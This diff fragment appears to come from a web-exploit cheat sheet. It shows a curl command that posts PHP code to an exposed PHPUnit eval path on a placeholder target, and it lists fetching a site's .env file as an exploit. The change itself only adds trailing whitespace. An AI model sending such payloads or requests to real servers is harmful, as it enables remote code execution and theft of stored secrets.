@@ -9,7 +9,7 @@ curl -d "<?php echo php_uname(); ?>" http://target.com/vendor/phpunit/phpunit/sr
 ```
 
 2. Exposed environment variables 
-* Full Path Exploit : http://target.com/.env
+* Full Path Exploit : http://target.com/.env 
 
 ![Environment Variables](https://1.bp.blogspot.com/-EUTxgP5XE6Q/XkgB4SyWSbI/AAAAAAAAAQA/eqtALOjLKKA46si-lIosm6cDVmxByjzIQCLcBGAsYHQ/s1600/1.png)
 
